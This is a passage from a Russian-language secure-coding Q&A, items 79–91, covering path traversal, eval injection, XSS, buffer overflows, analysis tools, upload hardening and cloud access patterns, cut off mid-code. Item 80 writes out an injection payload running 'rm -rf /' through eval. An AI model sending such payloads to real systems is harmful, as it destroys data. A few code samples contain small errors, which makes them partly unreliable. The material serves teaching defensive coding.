### 79. Как безопасно прочитать файл, имя которого пришло от пользователя?

**Ответ:** Для безопасного чтения файла, имя которого пришло от пользователя, нужно применить следующие меры:

**1. Валидация имени файла (allowlist):**
```python
import os
import re
from pathlib import Path

def safe_read_file(filename):
    # Проверка на допустимые символы
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError("Invalid filename")
    
    # Запрет на path traversal
    if '..' in filename or '/' in filename or '\\' in filename:
        raise ValueError("Path traversal detected")
    
    # Определение базовой директории
    BASE_DIR = "/var/www/uploads"
    
    # Использование Path для безопасной работы с путями
    safe_path = Path(BASE_DIR) / filename
    
    # Проверка, что итоговый путь находится в разрешённой директории
    try:
        safe_path.resolve().relative_to(Path(BASE_DIR).resolve())
    except ValueError:
        raise ValueError("Path outside allowed directory")
    
    # Проверка существования файла
    if not safe_path.exists():
        raise FileNotFoundError("File not found")
    
    # Проверка, что это файл, а не директория
    if not safe_path.is_file():
        raise ValueError("Not a file")
    
    # Чтение файла
    with open(safe_path, 'rb') as f:
        return f.read()
```

**2. Использование whitelist допустимых файлов:**
```python
ALLOWED_FILES = {'config.txt', 'data.json', 'readme.md'}

def safe_read_file(filename):
    if filename not in ALLOWED_FILES:
        raise ValueError("File not allowed")
    
    BASE_DIR = "/var/www/uploads"
    filepath = os.path.join(BASE_DIR, filename)
    
    # Дополнительная проверка
    realpath = os.path.realpath(filepath)
    if not realpath.startswith(os.path.realpath(BASE_DIR)):
        raise ValueError("Invalid path")
    
    with open(realpath, 'rb') as f:
        return f.read()
```

**3. Использование ID вместо имён файлов:**
```python
# Сохранение файла
def save_file(user_file):
    file_id = str(uuid.uuid4())
    filepath = os.path.join(UPLOAD_DIR, file_id)
    # Сохранить файл с ID, а не с исходным именем
    with open(filepath, 'wb') as f:
        f.write(user_file.read())
    return file_id

# Чтение файла
def read_file(file_id):
    if not re.match(r'^[a-f0-9-]{36}$', file_id):  # UUID format
        raise ValueError("Invalid file ID")
    
    filepath = os.path.join(UPLOAD_DIR, file_id)
    # Безопасно, так как ID валидируется
    with open(filepath, 'rb') as f:
        return f.read()
```

---

### 80. Как исправить уязвимость в eval(request.args.get('code'))?

**Ответ:** В данном коде присутствует критическая уязвимость **Code Injection (CWE-94)** — выполнение произвольного кода.

**Проблема:** Функция `eval()` выполняет произвольный Python-код, что позволяет злоумышленнику выполнить любые команды на сервере.

**Пример атаки:**
```python
# Злонамеренный запрос
# /page?code=__import__('os').system('rm -rf /')

eval(request.args.get('code'))  # Выполнит команду удаления файлов!
```

**Безопасные исправления:**

**1. Полностью отказаться от eval() и использовать безопасные альтернативы:**
```python
# Если нужен калькулятор
import ast
import operator

ALLOWED_OPERATORS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
}

def safe_eval(expr):
    # Парсинг в AST
    try:
        tree = ast.parse(expr, mode='eval')
    except SyntaxError:
        raise ValueError("Invalid expression")
    
    # Проверка, что используются только безопасные операторы
    def check_node(node):
        if isinstance(node, (ast.Constant, ast.NameConstant)):
            return True
        elif isinstance(node, ast.BinOp):
            if type(node.op) not in ALLOWED_OPERATORS:
                raise ValueError("Unsupported operator")
            return check_node(node.left) and check_node(node.right)
        elif isinstance(node, ast.Num):
            return True
        else:
            raise ValueError("Unsupported operation")
    
    if not check_node(tree.body):
        raise ValueError("Unsafe expression")
    
    # Безопасное вычисление
    return eval(compile(tree, '<string>', 'eval'), {"__builtins__": {}})
```

**2. Использовать whitelist разрешённых операций:**
```python
ALLOWED_EXPRESSIONS = {
    'sum': lambda x, y: x + y,
    'multiply': lambda x, y: x * y,
    # и т.д.
}

def safe_operation(operation, *args):
    if operation not in ALLOWED_EXPRESSIONS:
        raise ValueError("Operation not allowed")
    
    # Валидация аргументов
    for arg in args:
        if not isinstance(arg, (int, float)):
            raise ValueError("Invalid argument type")
    
    return ALLOWED_EXPRESSIONS[operation](*args)

# Использование
operation = request.args.get('op')  # 'sum', 'multiply', etc.
result = safe_operation(operation, arg1, arg2)
```

**3. Использовать sandbox или ограниченный интерпретатор:**
```python
# Использование RestrictedPython или аналогичных библиотек
from RestrictedPython import compile_restricted
from RestrictedPython.Guards import safe_builtins

def safe_exec(code):
    # Компиляция с ограничениями
    byte_code = compile_restricted(code, '<inline>', 'eval')
    # Выполнение с безопасным окружением
    return eval(byte_code, {"__builtins__": safe_builtins}, {})
```

**4. Если eval() действительно необходим, максимально ограничить окружение:**
```python
def limited_eval(code):
    # Очень ограниченное окружение
    safe_dict = {
        "__builtins__": {},
        "abs": abs,
        "max": max,
        "min": min,
        "sum": sum,
    }
    
    # Валидация входных данных
    if not re.match(r'^[0-9+\-*/(). ]+$', code):
        raise ValueError("Invalid characters")
    
    return eval(code, safe_dict)
```

**Рекомендация:** Лучше всего полностью отказаться от `eval()` и использовать безопасные альтернативы или специализированные библиотеки.

---

### 81. Как предотвратить XSS при выводе пользовательского ввода в HTML?

**Ответ:** Для предотвращения **XSS (Cross-Site Scripting, CWE-79)** при выводе пользовательского ввода в HTML необходимо экранировать специальные HTML-символы.

**1. Экранирование HTML (HTML Encoding):**
```python
# Python
import html

user_input = request.form.get('comment')
# Безопасный вывод
safe_output = html.escape(user_input)
# <script>alert('XSS')</script> → &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
```

```javascript
// JavaScript/Node.js
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}

const safeOutput = escapeHtml(userInput);
```

**2. Использование шаблонизаторов с автоматическим экранированием:**
```python
# Jinja2 (Python)
from jinja2 import Environment, escape

# Автоматическое экранирование включено по умолчанию
{{ user_input }}  # Автоматически экранируется
{{ user_input | safe }}  # Только если вы уверены, что данные безопасны
```

```python
# Django (Python)
# В шаблонах Django автоматическое экранирование включено по умолчанию
{{ user_input }}  # Автоматически экранируется
{{ user_input | safe }}  # Отключение экранирования (опасно!)
```

**3. Content Security Policy (CSP):**
```html
<!-- В HTTP заголовках или meta теге -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';">
```

```python
# В заголовках ответа
response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
```

**4. Валидация и санитизация входных данных:**
```python
import re
import html
from bleach import clean

# Использование библиотеки bleach для очистки HTML
user_input = request.form.get('comment')
# Разрешить только определённые HTML-теги
safe_html = clean(user_input, tags=['p', 'br', 'strong', 'em'], strip=True)
```

**5. Для разных контекстов вывода — разные методы экранирования:**
```python
# HTML-контекст
html.escape(user_input)

# HTML-атрибут
html.escape(user_input, quote=True)

# JavaScript-контекст
import json
json.dumps(user_input)  # Экранирует для JavaScript

# URL-контекст
from urllib.parse import quote
quote(user_input, safe='')
```

**6. Использование DOMPurify на клиенте (JavaScript):**
```javascript
// DOMPurify — библиотека для очистки HTML
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: []
});
```

**Рекомендации:**
- Всегда экранируйте пользовательский ввод перед выводом в HTML
- Используйте шаблонизаторы с автоматическим экранированием
- Применяйте Content Security Policy
- Проводите валидацию на стороне сервера
- Для разрешения HTML используйте whitelist разрешённых тегов

---

### 82. Как предотвратить path traversal при обработке пути к файлу?

**Ответ:** Для предотвращения **Path Traversal (Directory Traversal, CWE-22)** необходимо валидировать и нормализовать пути, ограничивая доступ только к разрешённым директориям.

**1. Использование Path.resolve() и проверка базовой директории:**
```python
from pathlib import Path
import os

def safe_read_file(filename):
    # Базовая директория
    BASE_DIR = Path("/var/www/uploads")
    
    # Полный путь
    file_path = BASE_DIR / filename
    
    # Нормализация пути и проверка, что он внутри BASE_DIR
    try:
        resolved = file_path.resolve()
        resolved.relative_to(BASE_DIR.resolve())
    except ValueError:
        raise ValueError("Path traversal detected")
    
    # Дополнительная проверка
    if '..' in str(resolved):
        raise ValueError("Invalid path")
    
    with open(resolved, 'rb') as f:
        return f.read()
```

**2. Удаление небезопасных последовательностей:**
```python
import os
import re

def safe_path(filename):
    # Удаление path traversal последовательностей
    filename = filename.replace('..', '')
    filename = filename.replace('/', '')
    filename = filename.replace('\\', '')
    
    # Валидация на допустимые символы
    if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
        raise ValueError("Invalid filename")
    
    BASE_DIR = "/var/www/uploads"
    filepath = os.path.join(BASE_DIR, filename)
    
    # Проверка реального пути
    realpath = os.path.realpath(filepath)
    if not realpath.startswith(os.path.realpath(BASE_DIR)):
        raise ValueError("Path outside allowed directory")
    
    return realpath
```

**3. Использование whitelist разрешённых файлов:**
```python
ALLOWED_FILES = {'config.txt', 'data.json', 'readme.md'}

def safe_read_file(filename):
    if filename not in ALLOWED_FILES:
        raise ValueError("File not allowed")
    
    BASE_DIR = "/var/www/uploads"
    filepath = os.path.join(BASE_DIR, filename)
    
    # Дополнительная проверка
    if os.path.commonpath([BASE_DIR, filepath]) != BASE_DIR:
        raise ValueError("Invalid path")
    
    with open(filepath, 'rb') as f:
        return f.read()
```

**4. Использование идентификаторов вместо имён файлов:**
```python
import uuid

# Сохранение файла
def save_file(user_file):
    file_id = str(uuid.uuid4())
    filepath = os.path.join(UPLOAD_DIR, file_id)
    # Сохранить файл с безопасным ID
    with open(filepath, 'wb') as f:
        f.write(user_file.read())
    return file_id

# Чтение по ID
def read_file(file_id):
    # Валидация UUID
    if not re.match(r'^[a-f0-9-]{36}$', file_id):
        raise ValueError("Invalid file ID")
    
    filepath = os.path.join(UPLOAD_DIR, file_id)
    with open(filepath, 'rb') as f:
        return f.read()
```

**5. Использование chroot или jail (на уровне ОС):**
```python
import os

def chroot_safe_read_file(filename):
    # Изменение корневой директории процесса (требует root)
    os.chroot("/var/www/uploads")
    # Теперь путь /var/www/uploads становится корневым /
    with open(f'/{filename}', 'rb') as f:  # Безопасно
        return f.read()
```

**6. Использование библиотек для работы с путями:**
```python
from werkzeug.utils import secure_filename

def safe_filename(filename):
    # Функция из Flask/Werkzeug для безопасных имён файлов
    safe = secure_filename(filename)
    # Удаляет небезопасные символы и path traversal
    return safe
```

---

### 83. Как исправить переполнение буфера в strcpy(buf, user_input)?

**Ответ:** В данном коде присутствует уязвимость **Buffer Overflow (CWE-120)** из-за использования небезопасной функции `strcpy()`.

**Проблема:** `strcpy()` не проверяет размер буфера и может переписать память, что приводит к переполнению буфера.

**Безопасные исправления:**

**1. Использование strncpy() с проверкой размера:**
```c
char buf[256];
size_t buf_size = sizeof(buf);

// Безопасное копирование с ограничением размера
strncpy(buf, user_input, buf_size - 1);
buf[buf_size - 1] = '\0';  // Гарантированное завершение строки

// Дополнительная проверка
if (strlen(user_input) >= buf_size) {
    // Обработка ошибки: входная строка слишком длинная
    return ERROR_TOO_LONG;
}
```

**2. Использование snprintf() (предпочтительно):**
```c
char buf[256];
size_t buf_size = sizeof(buf);

// Безопасное копирование с автоматическим ограничением
int written = snprintf(buf, buf_size, "%s", user_input);

if (written < 0 || written >= buf_size) {
    // Строка была обрезана
    return ERROR_TRUNCATED;
}
```

**3. Использование strlcpy() (если доступна):**
```c
char buf[256];
size_t buf_size = sizeof(buf);

// strlcpy всегда завершает строку и возвращает длину
size_t copied = strlcpy(buf, user_input, buf_size);
if (copied >= buf_size) {
    // Строка была обрезана
    return ERROR_TRUNCATED;
}
```

**4. Валидация размера перед копированием:**
```c
char buf[256];
size_t buf_size = sizeof(buf);

// Проверка размера перед копированием
if (strlen(user_input) >= buf_size) {
    return ERROR_TOO_LONG;
}

strcpy(buf, user_input);  // Теперь безопасно
```

**5. Использование современных безопасных функций (C11):**
```c
// Использование bounds-checked функций (опциональная часть C11)
#define __STDC_WANT_LIB_EXT1__ 1
#include <string.h>

char buf[256];
errno_t result = strcpy_s(buf, sizeof(buf), user_input);
if (result != 0) {
    // Обработка ошибки
    return ERROR_COPY_FAILED;
}
```

**6. Использование динамической памяти (если размер неизвестен):**
```c
// Выделение памяти под нужный размер
size_t input_len = strlen(user_input);
char *buf = malloc(input_len + 1);
if (buf == NULL) {
    return ERROR_MALLOC_FAILED;
}

strcpy(buf, user_input);
// ... использование buf ...
free(buf);  // Освобождение памяти
```

**Рекомендации:**
- Никогда не используйте `strcpy()`, `strcat()`, `sprintf()` с пользовательским вводом
- Используйте функции с ограничением размера: `strncpy()`, `snprintf()`, `strlcpy()`
- Всегда проверяйте размер входных данных перед копированием
- Используйте статический анализ (SAST) для выявления небезопасных функций

---

### 84. Какой анализ обнаружит деление на ноль в 100 / (a - b), если a == b?

**Ответ:** Следующие виды анализа могут обнаружить деление на ноль:

**1. Статический анализ (SAST) с символьным выполнением:**
```python
# Пример: анализ может обнаружить, что если a == b, то (a - b) == 0
# И обнаружить деление на ноль
result = 100 / (a - b)  # Если a == b, то деление на 0
```

**2. Статический анализ с анализом потока данных (Data Flow Analysis):**
- Отслеживание значений переменных `a` и `b`
- Определение, что в некоторых путях выполнения `a - b == 0`
- Обнаружение потенциального деления на ноль

**3. Статический анализ с анализом путей выполнения (Path Analysis):**
- Построение графа потока управления (CFG)
- Анализ всех путей выполнения
- Обнаружение путей, где `a == b` приводит к делению на ноль

**4. Статический анализ с абстрактной интерпретацией:**
- Абстрактное представление значений переменных
- Определение условий, при которых знаменатель равен нулю

**5. Символьное выполнение (Symbolic Execution):**
- Выполнение программы с символьными значениями вместо конкретных
- Решение ограничений: когда `a - b == 0`?
- Обнаружение деления на ноль

**6. Специализированные инструменты:**
- **PVS-Studio** — обнаруживает деление на ноль
- **Coverity** — анализ потока данных
- **Clang Static Analyzer** — обнаружение деления на ноль
- **Infer** (Facebook) — статический анализ с символьным выполнением
- **CodeQL** — запросы для поиска деления на ноль

**7. Тестирование (динамический анализ):**
```python
# Unit-тест
def test_division_by_zero():
    a = 5
    b = 5
    with pytest.raises(ZeroDivisionError):
        result = 100 / (a - b)
```

**Инструменты, которые обнаружат:**
- **PVS-Studio:** V609 Division or mod by zero
- **Clang Static Analyzer:** Division by zero
- **Infer:** Division by zero
- **CodeQL:** Division by zero query

---

### 85. Какой анализ обнаружит использование неинициализированной переменной?

**Ответ:** Следующие виды анализа могут обнаружить использование неинициализированной переменной:

**1. Статический анализ с анализом потока данных (Data Flow Analysis):**
```c
int x;  // Не инициализирована
if (condition) {
    x = 5;
}
int y = x;  // x может быть не инициализирована
```

**2. Статический анализ с анализом определений и использований (Def-Use Analysis):**
- Отслеживание определения (def) переменной
- Отслеживание использования (use) переменной
- Обнаружение использований без предшествующих определений

**3. Статический анализ с абстрактной интерпретацией:**
- Отслеживание состояния переменных (инициализирована/не инициализирована)
- Обнаружение использования переменной в неинициализированном состоянии

**4. Инструменты статического анализа:**
- **PVS-Studio:** V614 Uninitialized variable used
- **Clang Static Analyzer:** Uninitialized variable
- **GCC -Wuninitialized:** Предупреждение компилятора
- **Coverity:** Uninitialized variable defect
- **Infer:** Uninitialized variable
- **CodeQL:** Uninitialized variable query

**5. Динамический анализ с инструментированием:**
```c
// Использование AddressSanitizer (ASan) или Valgrind
// Обнаруживает использование неинициализированной памяти во время выполнения
```

**6. Компиляторы с предупреждениями:**
```bash
# GCC/Clang
gcc -Wall -Wuninitialized -O2 program.c
# Выдаст предупреждение об использовании неинициализированной переменной
```

**Пример обнаружения:**
```c
int x;
int y = x;  // Предупреждение: 'x' используется без инициализации
```

---

### 86. Какой анализ обнаружит утечку памяти в malloc() без free()?

**Ответ:** Следующие виды анализа могут обнаружить утечку памяти:

**1. Статический анализ с анализом выделения/освобождения памяти (Resource Leak Analysis):**
```c
void *ptr = malloc(100);
// Нет free(ptr) - утечка памяти
```

**2. Статический анализ с анализом парных операций (Pair Analysis):**
- Обнаружение парных операций: malloc/free, fopen/fclose, etc.
- Обнаружение случаев, когда выделение памяти не сопровождается освобождением

**3. Динамический анализ с инструментированием:**
- **Valgrind (Memcheck):** Обнаружение утечек памяти во время выполнения
- **AddressSanitizer (ASan):** Обнаружение утечек памяти
- **LeakSanitizer:** Специализированный инструмент для утечек

**4. Инструменты статического анализа:**
- **PVS-Studio:** V773 Memory leak
- **Coverity:** Resource leak
- **Clang Static Analyzer:** Memory leak
- **Infer:** Memory leak
- **CodeQL:** Memory leak query
- **Cppcheck:** Memory leak detection

**5. Специализированные инструменты:**
- **Dr. Memory:** Обнаружение утечек памяти
- **Application Verifier:** Для Windows
- **Purify:** Коммерческий инструмент

**Пример использования Valgrind:**
```bash
valgrind --leak-check=full ./program
# Вывод:
# ==12345== 100 bytes in 1 blocks are definitely lost
# ==12345==    at 0x4C2AB80: malloc (vg_replace_malloc.c:299)
```

**Пример использования AddressSanitizer:**
```bash
gcc -fsanitize=address -g program.c -o program
./program
# Вывод информации об утечках памяти
```

**Статический анализ может обнаружить:**
```c
void function() {
    void *ptr = malloc(100);
    // Выход из функции без free(ptr)
    // Статический анализатор предупредит о потенциальной утечке
}
```

---

### 87. Какой анализ нужен для поиска уязвимостей через вызовы функций в других модулях?

**Ответ:** Для поиска уязвимостей через вызовы функций в других модулях необходим **межпроцедурный анализ (Interprocedural Analysis, IPA)**.

**1. Межпроцедурный статический анализ:**
- Анализ вызовов функций через границы модулей
- Отслеживание потока данных через вызовы функций
- Анализ параметров функций и возвращаемых значений

**2. Межпроцедурный анализ потока данных (Interprocedural Data Flow Analysis):**
```c
// Модуль 1
void process_data(char *input) {
    // ...
}

// Модуль 2
void handle_request(char *user_input) {
    process_data(user_input);  // Нужно отследить поток данных
}
```

**3. Анализ межмодульных вызовов (Cross-Module Analysis):**
- Анализ вызовов между разными файлами/модулями
- Учёт экспортируемых и импортируемых функций
- Анализ связей между модулями

**4. Инструменты с межпроцедурным анализом:**
- **PVS-Studio:** Поддерживает межпроцедурный анализ
- **Coverity:** Глубокий межпроцедурный анализ
- **CodeSonar:** Межпроцедурный анализ для поиска уязвимостей
- **Klocwork:** Межпроцедурный анализ потока данных
- **Infer:** Межпроцедурный анализ
- **CodeQL:** Запросы с поддержкой межпроцедурного анализа

**5. Анализ точек входа (Entry Point Analysis):**
- Определение всех точек входа в программу
- Отслеживание путей от точек входа через вызовы функций
- Обнаружение уязвимостей на всех уровнях

**6. Анализ с использованием summary-функций:**
- Построение summary для каждой функции (что функция делает с параметрами)
- Использование summary для анализа вызывающих функций

**Пример:**
```c
// utils.c
void sanitize_input(char *input) {
    // Санитизация
}

// main.c
#include "utils.h"
void handle_request(char *user_input) {
    char *cleaned = sanitize_input(user_input);
    sql_query(cleaned);  // Нужно отследить, что cleaned безопасен
}
```

**Характеристики межпроцедурного анализа:**
- Более точный, но требует больше ресурсов
- Может анализировать всю программу целиком
- Важен для обнаружения сложных уязвимостей, проходящих через несколько функций

---

### 88. Какие меры нужно принять при загрузке файлов от пользователя?

**Ответ:** При загрузке файлов от пользователя необходимо применить следующие меры безопасности:

**1. Валидация типа файла:**
```python
import magic
import os

ALLOWED_MIME_TYPES = {'image/jpeg', 'image/png', 'application/pdf'}
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.pdf'}

def validate_file(file):
    # Проверка расширения
    filename = file.filename
    ext = os.path.splitext(filename)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError("Invalid file extension")
    
    # Проверка MIME-типа по содержимому (не по расширению!)
    file_content = file.read()
    file.seek(0)  # Сброс указателя
    
    mime_type = magic.from_buffer(file_content, mime=True)
    if mime_type not in ALLOWED_MIME_TYPES:
        raise ValueError("Invalid file type")
    
    # Дополнительная проверка сигнатур файлов (magic bytes)
    if ext == '.jpg' and not file_content.startswith(b'\xff\xd8\xff'):
        raise ValueError("Invalid JPEG file")
    
    return True
```

**2. Ограничение размера файла:**
```python
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB

def validate_file_size(file):
    file.seek(0, os.SEEK_END)
    size = file.tell()
    file.seek(0)
    
    if size > MAX_FILE_SIZE:
        raise ValueError("File too large")
    
    if size == 0:
        raise ValueError("Empty file")
```

**3. Безопасное имя файла:**
```python
from werkzeug.utils import secure_filename
import uuid

def get_safe_filename(original_filename):
    # Генерация безопасного имени файла
    # Вариант 1: Использование UUID
    ext = os.path.splitext(original_filename)[1]
    return str(uuid.uuid4()) + ext
    
    # Вариант 2: Санитизация оригинального имени
    # return secure_filename(original_filename)
```

**4. Проверка на вредоносное содержимое:**
```python
import subprocess

def scan_for_viruses(filepath):
    # Использование антивируса (ClamAV и т.д.)
    result = subprocess.run(['clamscan', filepath], 
                          capture_output=True)
    if result.returncode != 0:
        raise ValueError("File contains malware")
```

**5. Изоляция загруженных файлов:**
```python
import os
from pathlib import Path

# Отдельная директория вне веб-корня
UPLOAD_DIR = Path("/var/uploads")
UPLOAD_DIR.mkdir(exist_ok=True)

# Ограничение прав доступа
os.chmod(UPLOAD_DIR, 0o700)

def save_file(file, filename):
    filepath = UPLOAD_DIR / filename
    
    # Проверка, что файл сохраняется в разрешённой директории
    try:
        filepath.resolve().relative_to(UPLOAD_DIR.resolve())
    except ValueError:
        raise ValueError("Invalid path")
    
    with open(filepath, 'wb') as f:
        f.write(file.read())
    
    # Установка безопасных прав
    os.chmod(filepath, 0o644)
```

**6. Сканирование изображений (для изображений):**
```python
from PIL import Image

def validate_image(file):
    try:
        img = Image.open(file)
        img.verify()  # Верификация целостности
        
        # Пересоздание изображения для удаления метаданных
        img = Image.open(file)
        # Сохранение без метаданных
        img.save(output_path, format='JPEG', quality=85)
    except Exception:
        raise ValueError("Invalid image")
```

**7. Ограничение доступа к загруженным файлам:**
```python
# Предоставление доступа через контролируемый endpoint
@app.route('/download/<file_id>')
def download_file(file_id):
    # Валидация file_id
    if not re.match(r'^[a-f0-9-]{36}$', file_id):
        abort(400)
    
    filepath = UPLOAD_DIR / file_id
    
    # Проверка существования
    if not filepath.exists():
        abort(404)
    
    # Проверка прав доступа пользователя
    if not user_has_access(request.user, file_id):
        abort(403)
    
    # Безопасная отдача файла
    return send_file(filepath, as_attachment=True)
```

**8. Логирование загрузок:**
```python
import logging

def log_file_upload(user, filename, file_size):
    logging.info(f"File upload: user={user}, filename={filename}, size={file_size}")
```

**9. Quarantine (карантин) подозрительных файлов:**
```python
QUARANTINE_DIR = Path("/var/quarantine")

def quarantine_file(filepath):
    # Перемещение в карантин для дальнейшего анализа
    quarantine_path = QUARANTINE_DIR / filepath.name
    shutil.move(filepath, quarantine_path)
```

**10. Проверка на двойные расширения:**
```python
def check_double_extension(filename):
    # Запрет файлов типа "file.jpg.exe"
    parts = filename.rsplit('.', 2)
    if len(parts) == 3:
        raise ValueError("Double extension not allowed")
```

**Итоговый пример:**
```python
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return "No file", 400
    
    file = request.files['file']
    
    # Валидация
    validate_file(file)
    validate_file_size(file)
    
    # Безопасное имя
    safe_filename = get_safe_filename(file.filename)
    
    # Сканирование
    scan_for_viruses(file)
    
    # Сохранение
    filepath = save_file(file, safe_filename)
    
    # Логирование
    log_file_upload(current_user, safe_filename, file.size)
    
    return {"file_id": safe_filename}, 200
```

---

### 89. Какой код соответствует безопасному паттерну «claim check»?

**Ответ:** Паттерн **"Claim Check"** (чек-квитанция) используется для передачи больших данных через промежуточную систему, передавая только идентификатор (чек) вместо самих данных.

**Безопасная реализация паттерна:**

```python
import uuid
import hashlib
import redis
from cryptography.fernet import Fernet

# Хранилище данных (Redis, база данных, объектное хранилище)
storage = redis.Redis()

class ClaimCheckService:
    def __init__(self):
        self.cipher = Fernet(Fernet.generate_key())
    
    def store_data(self, data: bytes) -> str:
        """Сохраняет данные и возвращает claim check (ID)"""
        # Генерация уникального ID
        claim_id = str(uuid.uuid4())
        
        # Шифрование данных перед сохранением
        encrypted_data = self.cipher.encrypt(data)
        
        # Сохранение в безопасном хранилище
        storage.setex(
            f"claim:{claim_id}",
            ttl=3600,  # TTL для автоматического удаления
            value=encrypted_data
        )
        
        return claim_id
    
    def retrieve_data(self, claim_id: str) -> bytes:
        """Извлекает данные по claim check"""
        # Валидация claim_id (только UUID)
        if not re.match(r'^[a-f0-9-]{36}$', claim_id):
            raise ValueError("Invalid claim ID")
        
        # Извлечение данных
        encrypted_data = storage.get(f"claim:{claim_id}")
        if not encrypted_data:
            raise ValueError("Claim check not found or expired")
        
        # Расшифровка
        data = self.cipher.decrypt(encrypted_data)
        
        # Удаление после использования (опционально)
        storage.delete(f"claim:{claim_id}")
        
        return data

# Использование
service = ClaimCheckService()

# Отправитель: сохраняет большие данные
large_data = b"Very large data..." * 10000
claim_id = service.store_data(large_data)

# Передача только claim_id через очередь сообщений
message_queue.send({
    "claim_id": claim_id,
    "metadata": {...}
})

# Получатель: извлекает данные по claim_id
message = message_queue.receive()
data = service.retrieve_data(message["claim_id"])
```

**Безопасные особенности реализации:**
1. **Уникальный идентификатор** — UUID, который сложно угадать
2. **Валидация claim_id** — проверка формата перед использованием
3. **Шифрование данных** — данные шифруются перед сохранением
4. **TTL (Time To Live)** — автоматическое удаление через определённое время
5. **Одноразовое использование** — удаление после извлечения (опционально)
6. **Изоляция хранилища** — отдельное хранилище, не доступное напрямую

**Пример использования в очереди сообщений:**
```python
# Вместо передачи больших данных напрямую
# message = {"data": large_data}  # Неэффективно

# Передаём только claim check
message = {"claim_id": claim_id}  # Эффективно и безопасно
```

---

### 90. Какой код соответствует безопасному паттерну «Valet Key»?

**Ответ:** Паттерн **"Valet Key" (Ключ валета)** предоставляет временный, ограниченный доступ к ресурсу (например, облачному хранилищу) вместо постоянных полных прав.

**Безопасная реализация паттерна:**

```python
import boto3
from datetime import datetime, timedelta
from botocore.config import Config

class ValetKeyService:
    def __init__(self):
        self.s3_client = boto3.client('s3')
    
    def generate_valet_key(self, 
                          bucket: str, 
                          object_key: str,
                          user_id: str,
                          allowed_operations: list = ['GET']) -> dict:
        """Генерирует временный ключ доступа (SAS token)"""
        
        # Параметры доступа
        expiration = datetime.utcnow() + timedelta(hours=1)  # Короткий срок
        
        # Ограничения доступа
        conditions = [
            {'bucket': bucket},
            {'key': object_key},
        ]
        
        # Генерация предварительно подписанного URL (Presigned URL)
        presigned_url = self.s3_client.generate_presigned_url(
            'get_object' if 'GET' in allowed_operations else 'put_object',
            Params={
                'Bucket': bucket,
                'Key': object_key,
            },
            ExpiresIn=3600,  # 1 час
            HttpMethod='GET' if 'GET' in allowed_operations else 'PUT'
        )
        
        # Дополнительные ограничения
        valet_key = {
            'url': presigned_url,
            'expires_at': expiration.isoformat(),
            'bucket': bucket,
            'object_key': object_key,
            'allowed_operations': allowed_operations,
            'user_id': user_id
        }
        
        return valet_key
    
    def validate_valet_key(self, valet_key: dict) -> bool:
        """Валидирует valet key перед использованием"""
        expires_at = datetime.fromisoformat(valet_key['expires_at'])
        
        if datetime.utcnow() > expires_at:
            return False  # Ключ истёк
        
        return True

# Использование
service = ValetKeyService()

# Генерация временного ключа для пользователя
valet_key = service.generate_valet_key(
    bucket='user-uploads',
    object_key=f'user123/document.pdf',
    user_id='user123',
    allowed_operations=['GET']  # Только чтение
)

# Передача ключа пользователю
# Пользователь может загрузить файл напрямую в S3, используя этот ключ
return {"download_url": valet_key['url'], "expires_in": 3600}
```

**Для Azure Blob Storage:**
```python
from azure.storage.blob import BlobServiceClient, generate_blob_sas
from azure.storage.blob import BlobSasPermissions
from datetime import datetime, timedelta

def generate_azure_valet_key(account_name, container_name, blob_name):
    # Генерация SAS (Shared Access Signature) токена
    sas_token = generate_blob_sas(
        account_name=account_name,
        container_name=container_name,
        blob_name=blob_name,
        account_key=account_key,
        permission=BlobSasPermissions(read=True),  # Только чтение
        expiry=datetime.utcnow() + timedelta(hours=1)
    )
    
    # Формирование URL с SAS токеном
    blob_url = f"https://{account_name}.blob.core.windows.net/{container_name}/{blob_name}?{sas_token}"
    
    return blob_url
```

**Безопасные особенности:**
1. **Временный доступ** — ключ действителен только ограниченное время
2. **Ограниченные права** — только необходимые операции (read, write)
3. **Ограничение ресурсов** — доступ только к конкретному объекту/контейнеру
4. **Отзыв доступа** — невозможно отозвать без изменения политики хранилища
5. **Логирование** — все обращения логируются облачным провайдером

**Преимущества:**
- Не нужно хранить постоянные ключи на клиенте
- Минимизация ущерба при компрометации ключа
- Прямая загрузка в облако без нагрузки на сервер

---

### 91. Какой код нарушает принцип «минимизации поверхности атаки»?

**Ответ:** Принцип **"минимизации поверхности атаки"** нарушается, когда система предоставляет избыточные функции, интерфейсы или возможности, которые не используются, но могут быть атакованы.

**Примеры кода, нарушающего принцип:**

**1. Неиспользуемые эндпоинты API:**
```python
# ПЛОХО: Открыты все эндпоинты, включая административные
@app.route('/admin/users', methods=['GET', 'POST', 'PUT', 'DELETE'])
def admin_users():
    # Административный функционал доступен всем
    pass

@app.route('/debug/info')
def debug_info():
    # Отладочная информация доступна в production
    return {"internal_state": get_internal_state()}

@app.route('/api/v1/users', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def users_v1():
    # Старая версия API всё ещё доступна
    pass

@app.route('/api/v2/users', methods=['GET', 'POST'])
def users_v2():
    # Новая версия
    pass
```

**2. Избыточные методы HTTP:**
```python
# ПЛОХО: Разрешены все HTTP-методы, включая неиспользуемые
@app.route('/users/<id>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE'])
def users(id):
    # TRACE может использоваться для XST-атак
    pass
```

**3. Ненужные заголовки и информация:**
```python
# ПЛОХО: Раскрытие информации о версиях и технологиях
@app.after_request
def add_headers(response):
    response.headers['Server'] = 'Apache/2.4.41 (Unix)'  # Раскрытие версии
    response.headers['X-Powered-By'] = 'PHP/7.4.3'  # Раскрытие технологий
